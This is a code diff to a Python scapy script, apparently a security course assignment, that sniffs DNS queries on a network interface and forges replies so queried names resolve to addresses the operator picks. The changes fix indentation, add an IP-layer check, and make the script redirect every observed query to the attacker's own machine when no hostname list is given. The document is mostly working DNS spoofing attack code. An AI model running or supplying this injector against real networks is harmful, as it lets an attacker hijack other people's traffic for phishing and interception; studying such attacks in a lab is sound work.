@@ -14,6 +14,7 @@ If ‘-h‘ is not specified, your injector should forge replies for all observe
 # TEST: dig @1.1.1.1 foo1234.example.com
 import argparse
 import netifaces
+import socket
 from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, Ether, send, wrpcap
 
 def main():
@@ -35,14 +36,14 @@ def main():
         print('>>> Hostnames set: {}'.format(hostnames))
     else:
         hostnames = {}
-        print("No hostnames file provided. All requests will be intercepted.")
+        print(">>> No hostnames file provided. All requests will be intercepted.")
 
     print("##############################################################")
     # Start packet capturing and DNS injection
     capture = sniff(iface=args.interface, filter="udp and port 53", prn=lambda packet: process_packet(packet, args.interface, hostnames))
     wrpcap('dns.cap', capture)  # Write the captured packets to a file
     
-
+        
 
 def process_packet(packet, interface, hostnames):
     '''
@@ -51,29 +52,30 @@ def process_packet(packet, interface, hostnames):
     if packet.haslayer(DNSQR):  # Check if the packet has a DNS Question Record
         query_name = packet[DNSQR].qname.decode()
         
-    dns_type = packet[DNSQR].qtype
-    dns_id = packet[DNS].id
-    domain = packet[DNSQR].qname.decode("utf-8")
-    domain = domain[:-1]
+        dns_type = packet[DNSQR].qtype
+        dns_id = packet[DNS].id
+        domain = packet[DNSQR].qname.decode("utf-8")
+        domain = domain[:-1]
 
-    # If we want to intercept this domain, generate a fake response
-    
-    if str(domain) in list(map(str, hostnames.keys())) or not hostnames:
-        if packet.haslayer(Ether):
-            src_mac = packet[Ether].src
-            dst_mac = packet[Ether].dst
-            print(f'Source MAC Address: {src_mac}')                 # Wireshark: eth.src == ff:ff:ff:ff:ff:ff
-            print(f'Destination MAC Address: {dst_mac}')            # Wireshark: eth.dst == ff:ff:ff:ff:ff:ff
+        # If we want to intercept this domain, generate a fake response
+        
+        if str(domain) in list(map(str, hostnames.keys())) or not hostnames:
+            if packet.haslayer(Ether):
+                src_mac = packet[Ether].src
+                dst_mac = packet[Ether].dst
+                print(f'Source MAC Address: {src_mac}')                 # Wireshark: eth.src == ff:ff:ff:ff:ff:ff
+                print(f'Destination MAC Address: {dst_mac}')            # Wireshark: eth.dst == ff:ff:ff:ff:ff:ff
 
-        print(f'Intercepted DNS Request for: {query_name}') # Wireshark: dns.qry.name == "example.com"
-        print(f'DNS Request Type: {dns_type}') # Wireshark: dns.qry.type == 1 (For A records. Replace '1' with the relevant type number)
-        print(f'DNS Transaction ID: {hex(dns_id)}') # Wireshark: dns.id == 0x1a2b
-        print(f'Packet domain: {domain}')  
-        #print(f'Packet Summary: {packet.summary()}')
-        # print(f'Packet Details:\n{packet.show()}')  # Uncomment if you want a detailed view of the packet
-        print(">>> Sending fake response to: {}".format(packet[IP].src))
-        send_fake_response(packet, interface, hostnames)
-        print("##############################################################")
+            print(f'Intercepted DNS Request for: {query_name}') # Wireshark: dns.qry.name == "example.com"
+            print(f'DNS Request Type: {dns_type}') # Wireshark: dns.qry.type == 1 (For A records. Replace '1' with the relevant type number)
+            print(f'DNS Transaction ID: {hex(dns_id)}') # Wireshark: dns.id == 0x1a2b
+            print(f'Packet domain: {domain}')  
+            #print(f'Packet Summary: {packet.summary()}')
+            # print(f'Packet Details:\n{packet.show()}')  # Uncomment if you want a detailed view of the packet
+            if packet.haslayer(IP):
+                print(">>> Sending fake response to: {}".format(packet[IP].src))
+                send_fake_response(packet, interface, hostnames)
+            print("##############################################################")
 
 
 def send_fake_response(packet, interface, hostnames):
@@ -81,7 +83,11 @@ def send_fake_response(packet, interface, hostnames):
     #ip = hostnames.get(packet[DNSQR].qname.decode("utf-8"), local_ip)
     domain = packet[DNSQR].qname.decode("utf-8").rstrip('.')
     print(">>> Domain: {}".format(domain))
-    ip_address = hostnames[domain]
+    if hostnames:
+        ip_address = hostnames[domain]
+    else:
+        # get local machine's IP address
+        ip_address = socket.gethostbyname(socket.gethostname())
     print(">>> IP address of selected domain: {}".format(ip_address))
 
     # Build the DNS response
